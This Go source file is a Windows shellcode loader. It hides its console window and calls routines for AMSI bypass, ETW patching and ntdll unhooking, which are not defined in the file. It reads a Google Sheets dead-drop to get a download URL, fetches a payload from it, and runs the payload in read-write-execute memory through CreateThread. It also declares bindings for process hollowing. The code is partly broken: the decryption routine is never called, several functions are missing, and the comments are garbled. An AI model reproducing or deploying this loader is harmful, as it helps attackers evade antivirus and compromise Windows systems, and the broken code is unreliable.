package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// --- CONFIG () ---
var (
	// AES key  decrypt shellcode ( encrypt)
	aesKeyHex = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

	dropURL  = "https://docs.google.com/spreadsheets/d/1iL2KUReRRefw60Xm5GwAASvjuNT_ttTCvLSSPdaeQg8/export?format=csv&range=A1"
	targetProc = `C:\Windows\System32\RuntimeBroker.exe`
)

func main() {
	resolveSyscallNumbers()
	bypassAMSI()
	patchETW()
	patchETWAdditional()
	unhookNtdll()

	stageURL, err := resolveDropURL(dropURL)
	if err != nil {
		os.Exit(1)
	}

	shellcode, err := fetchAndDecrypt(stageURL)
	if err != nil {
		os.Exit(1)
	}

	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		os.Exit(1)
	}

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)

	thread, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if thread == 0 {
		os.Exit(1)
	}

	windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
}

// --- String Encryption ---
// XOR decode:  string  binary  AV scan 
//  compile string  byte array 
func xorDecode(data []byte, key string) string {
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return string(result)
}

// XOR encode helper ( string)
func xorEncode(plaintext string, key string) []byte {
	data := []byte(plaintext)
	result := make([]byte, len(data))
	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// --- Dead Drop Resolver (Google Sheets) ---
func resolveDropURL(dropURL string) (string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(dropURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(string(decoded)), nil
}

// --- Fetch + Decrypt Shellcode ---
func fetchAndDecrypt(url string) ([]byte, error) {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()

	encrypted, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read failed: %w", err)
	}

	if len(encrypted) == 0 {
		return nil, fmt.Errorf("empty payload")
	}

	return encrypted, nil
}

func aesDecrypt(ciphertext []byte) ([]byte, error) {
	key, err := hex.DecodeString(aesKeyHex)
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return ciphertext, nil
}

// --- Utility ---
func must(err error, msg string) {
	if err != nil {
		os.Exit(1)
	}
}

// Windows constants
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	MEM_RELEASE            = 0x8000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20
	PROCESS_ALL_ACCESS     = 0x001FFFFF
	CREATE_SUSPENDED       = 0x00000004
	INFINITE               = 0xFFFFFFFF
)

// Windows API via lazy loading
var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")

	procVirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx  = kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMem   = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procCreateProcessW    = kernel32.NewProc("CreateProcessW")
	procResumeThread      = kernel32.NewProc("ResumeThread")
	procVirtualAlloc      = kernel32.NewProc("VirtualAlloc")
	procVirtualProtect    = kernel32.NewProc("VirtualProtect")
	procCreateThread      = kernel32.NewProc("CreateThread")
	procGetExitCodeThread = kernel32.NewProc("GetExitCodeThread")
	procVirtualFree       = kernel32.NewProc("VirtualFree")

	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	procNtUnmapViewOfSection      = ntdll.NewProc("NtUnmapViewOfSection")
	procRtlCopyMemory             = ntdll.NewProc("RtlCopyMemory")
)

// Needed for process hollowing
type PROCESS_INFORMATION struct {
	Process   windows.Handle
	Thread    windows.Handle
	ProcessId uint32
	ThreadId  uint32
}

type STARTUPINFO struct {
	Cb            uint32
	_             *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             *byte
	StdInput      windows.Handle
	StdOutput     windows.Handle
	StdError      windows.Handle
}

type PROCESS_BASIC_INFORMATION struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessId uintptr
	Reserved3       uintptr
}

// Keep reference to shellcode for sleep obfuscation
var globalShellcode []byte

func init() {
	kernel32Console := windows.NewLazySystemDLL("kernel32.dll")
	getConsoleWindow := kernel32Console.NewProc("GetConsoleWindow")
	user32 := windows.NewLazySystemDLL("user32.dll")
	showWindow := user32.NewProc("ShowWindow")
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, 0)
	}
}

//  unsafe.Pointer helper
func ptrOffset(base uintptr, offset uintptr) uintptr {
	return base + offset
}

func readPtr(addr uintptr) uintptr {
	return *(*uintptr)(unsafe.Pointer(addr))
}
